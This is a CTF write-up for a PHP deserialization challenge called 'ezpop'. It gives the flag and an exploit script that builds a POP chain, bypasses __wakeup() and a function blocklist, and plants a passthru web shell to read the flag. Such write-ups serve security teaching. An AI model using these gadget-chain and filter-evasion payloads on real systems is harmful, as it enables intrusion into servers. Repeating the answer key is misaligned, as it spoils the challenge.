- **题目名称：** ezpop
- **题目类型：** WEB
- **题目难度：** 中等 
- **出题人：** ABU
- **考点：**

1. 反序列化__wakeup()绕过
2. php抽象类反序列化
3. 命令执行绕过

- **描述：** 听说你是pop大师！

- **flag：** flag{Y0u_Ar3_A_POP_Ma5ter!!!!}

- **Writeup：** 

  php抽象类不能被直接实例化，但其子类可以实例化，并可以通过子类来调用父类方法，并且子类必须实现父类的抽象方法，所以可以通过实例化evil来调用到父类的action方法，进入pass方法，此方法为抽象方法，在子类里实现，所以便进入evil的pass方法，再自己定义nomal类和evil的this->c，用url大小写来绕过date函数，实现绕过$this->a->d === shell的判断，用passthru函数绕过函数过滤，用sort读取flag。（当然要先绕过__wakeup()

```php
<?php
class openfunc{
    public $object;
    function __construct(){
        $this->object=new evil();
    }
    function __wakeup(){
        $this->object=new normal();
    }
    function __destruct(){
        $this->object->action();
    }
}
abstract class hack {

    abstract public function pass();

    public function action() {
        $this->pass();
    }
}
class normal{
    public $d;
    function action(){
        echo "you must bypass it";
    }
} 
class evil extends hack {
    public $data;
    public $a;
    public $b;
    public $c;
    function __construct(){
        $this->data='<?=passthru("sort /fffffl?ggggg");?>';
        $this->b=serialize(new normal());
        $this->c='%73%68%65%6C%6C';
    }
    public function pass(){
        $this->a = unserialize($this->b);
        $this->a->d = urldecode(date($this->c));
        if($this->a->d=== 'shell'){
           $this->shell();
        }
        else{
            die(date('Y/m/d H:i:s'));
        }
    }
    function shell(){
        if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump|php/i',$this->data)){
            die("you die");
        }
        $dir = 'scandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
        if(!file_exists($dir)){
            mkdir($dir);
            echo $dir;
        }
        file_put_contents("$dir" . "hack.php", $this->data);
    }
}
$a=serialize(new Openfunc());
echo $a;
?>
```

